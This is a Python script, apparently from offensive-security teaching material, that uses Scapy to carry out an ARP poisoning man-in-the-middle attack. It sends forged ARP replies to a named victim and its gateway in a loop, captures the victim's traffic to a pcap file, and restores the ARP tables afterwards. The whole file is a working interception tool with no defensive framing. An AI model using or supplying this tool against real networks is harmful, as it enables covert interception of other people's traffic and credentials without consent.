import threading
from scapy.all import (ARP, Ether, conf, send, sniff, wrpcap, srp)
import os
import sys
import time

def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp,_ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)
    
    def run(self):
        self.poison_thread = threading.Thread(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = threading.Thread(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print("TARGET INFO:")
        print(f'IP Source: {poison_victim.psrc}')
        print(f'IP Destination: {poison_victim.pdst}')
        print(f'MAC Destination: {poison_victim.hwdst}')
        print(f'MAC Source: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print("GATEWAY INFO:")
        print(f'IP Source: {poison_gateway.psrc}')
        print(f'IP Destination: {poison_gateway.pdst}')
        print(f'MAC Destination: {poison_gateway.hwdst}')
        print(f'MAC Source: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        time.sleep(2)
        print(f'Beginning the ARP poison...')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=200):
        time.sleep(5)
        print(f'Sniffing {count} packets...')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.join()
        print('Finished')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5) 

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
